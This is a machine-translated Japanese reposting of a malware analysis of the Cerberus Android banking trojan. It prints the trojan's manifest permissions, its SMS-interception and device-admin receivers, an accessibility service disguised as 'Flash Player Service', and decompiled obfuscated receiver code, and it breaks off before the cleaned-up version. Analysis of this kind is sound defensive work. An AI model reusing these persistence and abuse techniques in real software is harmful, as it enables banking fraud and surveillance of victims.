<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🍁 👎🏻 📲 Android向けの最新のマルウェアCerberusの探索 👩🏾‍💻 🍈 🔌</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="2020年と今日の鼻には、Androidバージョン9.0 Pieがすでにあります。Googleは胸を打って、製品が保護されていると言っています。しかし、悪者は眠らず、Android向けに独自のマルウェアを作成します。
 
 ランダムに、「Cerberus」と呼ばれるバンキングマルウェアである難読化さ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Android向けの最新のマルウェアCerberusの探索</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/459858/"><img src="https://habrastorage.org/getpro/habr/post_images/5fb/391/192/5fb39119247d45dfa979392da83f34f1.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2020年と今日の鼻には、Androidバージョン9.0 Pieがすでにあります。Googleは胸を打って、製品が保護されていると言っています。</font><font style="vertical-align: inherit;">しかし、悪者は眠らず、Android向けに独自のマルウェアを作成します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ランダムに、「Cerberus」と呼ばれるバンキングマルウェアである難読化されたapkファイルに遭遇し、それは2019年に出現しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このボットネットのAPKファイルには無効なサーバー接続アドレスが含まれているため、このボットネットは「モジュラー」システムを使用し、サーバーから直接機能をロードするため、作業ロジックと機能の一部はまだ調査されていません。</font></font><br>
<a name="habracut"></a><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析APKパッケージ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
apkパッケージを分析した後、トロイの木馬プログラムの構造をコンパイルしました。 </font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">レシーバー、自動実行+アラーム;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サービスは、8秒間隔のサイクルで実行され、ポップアップメッセージを表示して、ユーザー補助サービスを有効にし、画面ロック機能を有効にし、管理者権限を無効にします。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サービス、デバイスのセンサーからデータを収集し、マルウェアがデバイスの物理的なアクティビティを受信した。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サービスは、サイクルでデバイスの画面をロックします。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サービスは、サーバーとのデータ交換を担当します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">アクティビティ、HTMLコードをWebViewに読み込み、コンテンツを表示し、銀行アプリケーションのアクティビティを置き換える働きをします。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">アクティビティ、危険な許可を求めています。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">クラス、それ自体にプロジェクトの主要行（String）を格納します</font></font></li>
</ol><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">マニフェストから始めましょう</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アプリケーションのマニフェストは非常に興味深いものであり、これから、これは単純なアプリケーションではなく、通常のマルウェアであることがわかります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
たとえば、アプリケーションの権限を検討します。</font></font><br>
<br>
<pre><code class="xml hljs"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.RECEIVE_BOOT_COMPLETED"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.READ_PHONE_STATE"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.CALL_PHONE"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.READ_CONTACTS"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.READ_SMS"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.INTERNET"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.WAKE_LOCK"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.SEND_SMS"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.RECEIVE_SMS"</span>/&gt;</span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここで、アプリケーションがSMS、連絡先、通話、インターネットにアクセスでき、アプリケーションがスリープモードになっていることがわかります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さらに進んで、アプリケーションがSMSを送受信するための主要なものになることを可能にする特権を確認します。これは、被害者の電話でSMSメッセージを隠すために使用される悪役です。</font></font><br>
<br>
<pre><code class="xml hljs"> 	<span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iExuCRAHNmEv"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">"sms"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.SENDTO"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">"smsto"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.SEND"</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><font></font>
<font></font>
        <span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.lThcZejcCFe"</span> <span class="hljs-attr">android:permission</span>=<span class="hljs-string">"android.permission.BROADCAST_WAP_PUSH"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:mimeType</span>=<span class="hljs-string">"application/vnd.wap.mms-message"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.provider.Telephony.WAP_PUSH_DELIVER"</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><font></font>
<font></font>
        <span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.UwLgqh"</span> <span class="hljs-attr">android:permission</span>=<span class="hljs-string">"android.permission.SEND_RESPOND_VIA_MESSAGE"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">"sms"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.RESPOND_VIA_MESSAGE"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">"smsto"</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そしてもちろん、Receiverは、サービスを自動開始し、SMSを傍受する働きをします。</font></font><br>
<br>
<pre><code class="xml hljs">	<span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.wtawxrmdzej.oClFeoEgobr"</span> <span class="hljs-attr">android:permission</span>=<span class="hljs-string">"android.permission.BROADCAST_SMS"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span> <span class="hljs-attr">android:priority</span>=<span class="hljs-string">"979"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.QUICKBOOT_POWERON"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.htc.intent.action.QUICKBOOT_POWERON"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.PACKAGE_ADDED"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.USER_PRESENT"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.PACKAGE_REMOVED"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.provider.Telephony.SMS_DELIVER"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.BOOT_COMPLETED"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
管理者権限、これははるかに興味深いです。</font><font style="vertical-align: inherit;">アプリケーションは、アプリケーションの削除をブロックする必要があります（管理者権限が有効になっている場合、アプリケーションには「削除」ボタンがありません）。また、これらの権限により、デバイスからすべてを削除してデバイスをブロックできます。</font></font><br>
<br>
<pre><code class="xml hljs"> 	<span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">"@style/Theme.NoDisplay"</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">""</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.hwefoncq.ZQoykALT"</span> <span class="hljs-attr">android:excludeFromRecents</span>=<span class="hljs-string">"true"</span>/&gt;</span>
 	<span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">"System Driver"</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.hwefoncq.LuMBTH"</span> <span class="hljs-attr">android:permission</span>=<span class="hljs-string">"android.permission.BIND_DEVICE_ADMIN"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.app.device_admin"</span> <span class="hljs-attr">android:resource</span>=<span class="hljs-string">"@xml/ypqvk"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span> <span class="hljs-attr">android:priority</span>=<span class="hljs-string">"121"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.app.action.DEVICE_ADMIN_ENABLED"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.app.action.DEVICE_ADMIN_DISABLED"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さて、最も興味深いのは、アクセシビリティサービスです。</font><font style="vertical-align: inherit;">マルウェアが画面自体をクリックして、管理者権限を含む必要な権限を自分に与えることができるようにするために使用されます。</font><font style="vertical-align: inherit;">この権限を通じて、攻撃者はデバイス上のすべてのユーザーアクションを監視します。</font></font><br>
<br>
<pre><code class="xml hljs"> 	<span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">"Flash Player Service"</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.BEUZLDTj"</span> <span class="hljs-attr">android:permission</span>=<span class="hljs-string">"android.permission.BIND_ACCESSIBILITY_SERVICE"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.accessibilityservice.AccessibilityService"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.accessibilityservice"</span> <span class="hljs-attr">android:resource</span>=<span class="hljs-string">"@xml/ikxclmrgfqap"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さて、有効なMalvariサーバーアドレスがなければ、ほとんど関心のない残りのサービスとアクティビティです。</font></font><br>
<br>
<pre><code class="xml hljs">	<span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">"mhudtqw"</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.wsdckwoau"</span>/&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.coimtetkf"</span>/&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.dYDbaxro"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.HvGIrpl"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.HnzCyZAKNVN"</span>/&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
一般に、マルウェアは超自然的なものを使用せず、Androidでゼロデイを使用しません。</font><font style="vertical-align: inherit;">攻撃者は被害者から1つの許可を取得する必要がありますが、それ以上の許可を取得しないと、マルウェアがすべてのことを行います。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
GoogleはPlay以外のアプリの一部のAPI機能を制限する必要があります。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受信機</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このクラスのコードは難読化されていますが、これによってコードの調査が妨げられることはありません。</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">難読化されたコード</font></font></b><div class="spoiler_text"><pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> </span>{
 	<span class="hljs-keyword">int</span> i;<font></font>
    C0005b bVar;<font></font>
    String str;<font></font>
    String sb;<font></font>
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.f345b.mo39d(context, <span class="hljs-keyword">this</span>.f344a.f243g).contains(<span class="hljs-keyword">this</span>.f344a.f45aS) &amp;&amp; !<span class="hljs-keyword">this</span>.f345b.mo32b(context)) {
		<span class="hljs-keyword">this</span>.f345b.mo24a(<span class="hljs-keyword">this</span>.f347d, <span class="hljs-keyword">this</span>.f344a.f46aT);<font></font>
		C0005b bVar2 = <span class="hljs-keyword">this</span>.f345b;
		<span class="hljs-keyword">this</span>.f344a.getClass();<font></font>
		C0005b.m16a(context, <span class="hljs-string">""</span>, <span class="hljs-number">10000</span>);
		<span class="hljs-keyword">int</span> i2 = <span class="hljs-number">0</span>;
		<span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) {
			<span class="hljs-keyword">if</span> (i2 &lt; <span class="hljs-keyword">this</span>.f344a.f241ec.length) {
				<span class="hljs-keyword">if</span> (VERSION.SDK_INT &gt;= <span class="hljs-number">26</span> &amp;&amp; !<span class="hljs-keyword">this</span>.f346c.mo14b(context)) {
					<span class="hljs-keyword">break</span>;<font></font>
				}<font></font>
				<span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.f345b.mo25a(context, <span class="hljs-keyword">this</span>.f344a.f241ec[i2])) {
					<span class="hljs-keyword">if</span> (ppknbeydxzuwxxv.class.getName().equals(<span class="hljs-keyword">this</span>.f344a.f241ec[i2].getName())) {<font></font>
						context.stopService(<span class="hljs-keyword">new</span> Intent(context, <span class="hljs-keyword">this</span>.f344a.f241ec[i2]));<font></font>
					}<font></font>
					bVar = <span class="hljs-keyword">this</span>.f345b;<font></font>
					str = <span class="hljs-keyword">this</span>.f347d;<font></font>
					StringBuilder sb2 = <span class="hljs-keyword">new</span> StringBuilder();<font></font>
					sb2.append(<span class="hljs-keyword">this</span>.f344a.f90bK);<font></font>
					sb2.append(<span class="hljs-keyword">this</span>.f344a.f241ec[i2]);<font></font>
					sb = sb2.toString();<font></font>
				} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lsbcgaldiywkd.class.getName().equals(<span class="hljs-keyword">this</span>.f344a.f241ec[i2].getName())) {<font></font>
					context.startService(<span class="hljs-keyword">new</span> Intent(context, <span class="hljs-keyword">this</span>.f344a.f241ec[i2]));<font></font>
					bVar = <span class="hljs-keyword">this</span>.f345b;<font></font>
					str = <span class="hljs-keyword">this</span>.f347d;<font></font>
					StringBuilder sb3 = <span class="hljs-keyword">new</span> StringBuilder();<font></font>
					sb3.append(<span class="hljs-keyword">this</span>.f344a.f88bI);<font></font>
					sb3.append(<span class="hljs-keyword">this</span>.f344a.f241ec[i2]);<font></font>
					sb = sb3.toString();<font></font>
				} <span class="hljs-keyword">else</span> {
				<span class="hljs-keyword">int</span> parseInt = Integer.parseInt(<span class="hljs-keyword">this</span>.f345b.mo39d(context, <span class="hljs-keyword">this</span>.f344a.f47aU));
				<span class="hljs-keyword">this</span>.f344a.getClass();
				<span class="hljs-keyword">if</span> (parseInt &gt;= <span class="hljs-number">0</span>) {<font></font>
					context.startService(<span class="hljs-keyword">new</span> Intent(context, <span class="hljs-keyword">this</span>.f344a.f241ec[i2]));<font></font>
					bVar = <span class="hljs-keyword">this</span>.f345b;<font></font>
					str = <span class="hljs-keyword">this</span>.f347d;<font></font>
					StringBuilder sb4 = <span class="hljs-keyword">new</span> StringBuilder();<font></font>
					sb4.append(<span class="hljs-keyword">this</span>.f344a.f89bJ);<font></font>
					sb4.append(<span class="hljs-keyword">this</span>.f344a.f241ec[i2]);<font></font>
					sb = sb4.toString();<font></font>
				} <span class="hljs-keyword">else</span> {<font></font>
					i2++;<font></font>
				}<font></font>
			}<font></font>
			bVar.mo24a(str, sb);<font></font>
			i2++;<font></font>
			} <span class="hljs-keyword">else</span> {
				<span class="hljs-keyword">break</span>;<font></font>
			}<font></font>
		}<font></font>
		<span class="hljs-keyword">this</span>.f345b.mo23a(<span class="hljs-keyword">this</span>.f347d, context);
		<span class="hljs-keyword">this</span>.f345b.mo22a(context, <span class="hljs-keyword">this</span>.f344a.f259w, <span class="hljs-keyword">this</span>.f345b.mo33b(context, pzjzcxauihlf.class) ? <span class="hljs-keyword">this</span>.f344a.f42aP : <span class="hljs-keyword">this</span>.f344a.f39aM);
		<span class="hljs-keyword">if</span> (intent.getAction().equals(<span class="hljs-keyword">this</span>.f344a.f29aC)) {
			<span class="hljs-keyword">this</span>.f345b.mo20a(context, intent);<font></font>
		}<font></font>
		<span class="hljs-keyword">try</span> {<font></font>
			i = Integer.parseInt(<span class="hljs-keyword">this</span>.f345b.mo39d(context, <span class="hljs-keyword">this</span>.f344a.f58af));
			<span class="hljs-keyword">int</span> parseInt2 = Integer.parseInt(<span class="hljs-keyword">this</span>.f345b.mo39d(context, <span class="hljs-keyword">this</span>.f344a.f57ae)) + <span class="hljs-number">1</span>;<font></font>
			i++;<font></font>
			C0005b bVar3 = <span class="hljs-keyword">this</span>.f345b;<font></font>
			String str2 = <span class="hljs-keyword">this</span>.f344a.f57ae;<font></font>
			StringBuilder sb5 = <span class="hljs-keyword">new</span> StringBuilder();
			<span class="hljs-keyword">this</span>.f344a.getClass();<font></font>
			sb5.append(<span class="hljs-string">""</span>);<font></font>
			sb5.append(parseInt2);<font></font>
			bVar3.mo22a(context, str2, sb5.toString());<font></font>
			C0005b bVar4 = <span class="hljs-keyword">this</span>.f345b;<font></font>
			String str3 = <span class="hljs-keyword">this</span>.f344a.f58af;<font></font>
			StringBuilder sb6 = <span class="hljs-keyword">new</span> StringBuilder();
			<span class="hljs-keyword">this</span>.f344a.getClass();<font></font>
			sb6.append(<span class="hljs-string">""</span>);<font></font>
			sb6.append(i);<font></font>
			bVar4.mo22a(context, str3, sb6.toString());<font></font>
		} <span class="hljs-keyword">catch</span> (Exception e2) {<font></font>
			e = e2;<font></font>
			i = <span class="hljs-number">0</span>;<font></font>
			C0005b bVar5 = <span class="hljs-keyword">this</span>.f345b;<font></font>
			String str4 = <span class="hljs-keyword">this</span>.f344a.f252p;<font></font>
			StringBuilder sb7 = <span class="hljs-keyword">new</span> StringBuilder();<font></font>
			sb7.append(<span class="hljs-string">"(pro8)  | vvcy "</span>);<font></font>
			sb7.append(e.toString());<font></font>
			sb7.append(<span class="hljs-string">"::endLog::"</span>);<font></font>
			bVar5.mo31b(context, str4, sb7.toString());<font></font>
			<span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">3</span>) {
				<span class="hljs-keyword">return</span>;<font></font>
			}<font></font>
			<span class="hljs-keyword">return</span>;<font></font>
		}<font></font>
		<span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">3</span> &amp;&amp; !<span class="hljs-keyword">this</span>.f345b.mo46i(context) &amp;&amp; <span class="hljs-keyword">this</span>.f345b.mo48k(context) &amp;&amp; <span class="hljs-keyword">this</span>.f345b.mo33b(context, pzjzcxauihlf.class)) {
			<span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.f345b.mo33b(context, pzjzcxauihlf.class)) {
				<span class="hljs-keyword">this</span>.f345b.mo22a(context, <span class="hljs-keyword">this</span>.f344a.f12M, <span class="hljs-keyword">this</span>.f344a.f42aP);<font></font>
			}<font></font>
			Intent intent2 = <span class="hljs-keyword">new</span> Intent(context, lvhxcug.class);<font></font>
			intent2.putExtra(<span class="hljs-keyword">this</span>.f344a.f87bH, <span class="hljs-keyword">this</span>.f344a.f42aP);<font></font>
			intent2.addFlags(<span class="hljs-number">268435456</span>);<font></font>
			intent2.addFlags(<span class="hljs-number">536870912</span>);<font></font>
			intent2.addFlags(<span class="hljs-number">1073741824</span>);<font></font>
			context.startActivity(intent2);<font></font>
			C0005b bVar6 = <span class="hljs-keyword">this</span>.f345b;<font></font>
			String str5 = <span class="hljs-keyword">this</span>.f344a.f58af;<font></font>
			StringBuilder sb8 = <span class="hljs-keyword">new</span> StringBuilder();
			<span class="hljs-keyword">this</span>.f344a.getClass();<font></font>
			sb8.append(<span class="hljs-string">""</span>);<font></font>
			sb8.append(<span class="hljs-number">0</span>);<font></font>
			bVar6.mo22a(context, str5, sb8.toString());<font></font>
		}<font></font>
    }<font></font>
}</code></pre><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、コードについて少し説明します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Malvari設定はXMLファイルに保存され、ファイルは</font><i><font style="vertical-align: inherit;">/data/data/package_name/shared_prefs/Settings.xml</font></i><font style="vertical-align: inherit;">ディレクトリにあり</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます</font></font></i><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public String ReadXML-設定を読み取るためのメソッド</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public String SaveXML-設定を保存するためのメソッド</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public boolean DozeMode-Dozeモードが有効かどうかを確認します</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">パブリッククラスService_faはServiceを拡張します-デバイスの物理的なアクティビティを組み立てるためのサービス（ステップ、電話のシェイクなど）</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">パブリッククラスService_serverはService-サーバーに接続するためのサービスを拡張します</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">パブリッククラスService_event_loop extends Service-malvariの一部の関数を実行するために無限ループで実行されるサービス</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public void startOffDozeMode-Dozeモードを無効にするリクエスト</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public void startAlarm-10秒ごとにレシーバーを開始します</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public void interceptionSMS-SMSインターセプトを操作する方法</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public boolean isAccessibilityService-アクセスサービスが有効かどうかを確認するためのメソッド</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public boolean cis-CISに属する国、つまりua、ru、by、tj、uz、tm、az、am、kz、kg、およびmd（国の略称）におけるマルヴァリの働きを阻止する方法</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記の難読化されたコードをより読みやすく通常の形式にしようとしました：</font></font><br>
<br>
